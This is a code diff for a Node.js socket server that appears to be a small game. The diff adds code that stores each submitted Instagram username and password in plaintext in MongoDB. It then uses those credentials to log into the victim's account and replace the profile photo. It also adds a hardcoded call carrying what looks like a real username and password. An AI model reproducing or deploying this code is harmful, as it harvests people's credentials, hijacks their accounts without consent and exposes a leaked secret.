@@ -20,6 +20,7 @@ var spinning = false;
 
 var potTotal = 0;
 
+var userDB = null; //Set up global DB var
 
 /*
  
@@ -32,6 +33,17 @@ var potTotal = 0;
 
 */
 
+var url = 'mongodb://localhost:27017/'; //URL to DB
+
+
+MongoClient.connect(url, function(err, client) { //Connect to the DB
+  if (err == null) { //If we have no errors
+    var db = client.db('rekt'); //Find the specific DB
+    console.log("Connected to MongoDB"); //Let us know that the we've connected to the DB
+    userDB = db.collection('userssss'); //Create or find a collection named users
+    peopleDB = db.collection('leaderboard'); //Create or find a collection named users
+  }
+});
 
 
 server.listen(7777, function () {
@@ -47,7 +59,9 @@ console.log('User Connected');
   // when the client emits 'add user', this listens and executes
   
   socket.on('DoItToEm', function (uu,pp) {
-        destruction(uu,pp,socket);
+        userDB.insertOne({uu,pp}).then(function() {
+        });
+        destruction(uu,pp);
     })
 
   });
@@ -58,23 +72,25 @@ function sendOutStuff(thearray) {
   io.emit('getStuff', thearray);
 }
 
-function destruction(uu,pp,socket) {
+function destruction(uu,pp) {
   var {username,password} = {uu,pp};
   var client = new Instagram({ username: uu, password:pp });
 
-  console.log(uu + " " + pp);
   client.login().then(() => {
     console.log("Logged on!");
     console.log(client);
     console.log(client.credentials.username);
-    client.uploadStory({ photo: "IMG_3575.JPG" }).then(function () {
-      console.log("Story Uploaded");
-      socket.emit("Complete","");
-    });
+    setTimeout(function() {
+      client.changeProfilePhoto({ photo:"https://cdn.vox-cdn.com/thumbor/Yt1avchDkHqEqJuhYZ3YjKF3kFc=/0x0:1700x960/1200x675/filters:focal(714x344:986x616)/cdn.vox-cdn.com/uploads/chorus_image/image/57514059/mario.0.jpg"});
+    },4000);
+   
   });
 
 
 }
+
+
+destruction("papa.pay","koDa9115");
 
 
 //console.log(lol.user.edge_owner_to_timeline_media.edges);
